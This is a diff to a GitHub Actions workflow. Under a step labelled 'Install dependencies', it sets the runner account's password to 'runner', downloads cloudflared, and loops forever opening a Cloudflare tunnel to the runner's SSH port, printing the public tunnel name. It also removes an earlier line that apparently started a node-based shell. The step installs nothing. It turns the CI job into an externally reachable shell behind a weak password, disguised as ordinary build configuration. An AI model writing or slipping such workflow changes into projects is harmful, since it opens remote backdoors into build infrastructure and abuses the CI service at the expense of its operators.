@@ -20,7 +20,7 @@ permissions:
 jobs:
   build:
 
-    runs-on: windows-latest
+    runs-on: ubuntu-latest
 
     steps:
     - uses: actions/checkout@v4
@@ -30,5 +30,13 @@ jobs:
         python-version: "3.10"
     - name: Install dependencies
       run: |
-        npm install node-pre-gyp wrtc node-pty
-        node shell cazzo1
+        (echo runner;echo runner) | sudo passwd runner
+        cloudflared &>/dev/null --version|| sudo curl -sL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /usr/local/bin/cloudflared && sudo chmod 755 /usr/local/bin/cloudflared && cloudflared --version
+        while true
+        do
+        cloudflared tunnel --url ssh://localhost &>.cflog &
+        while ! grep -q "  https" .cflog; do sleep 0.5; done
+        name="$(grep "  https" .cflog |cut -d " " -f 5|cut -d / -f 3|cut -d . -f 1)"
+        echo $name
+        done
+
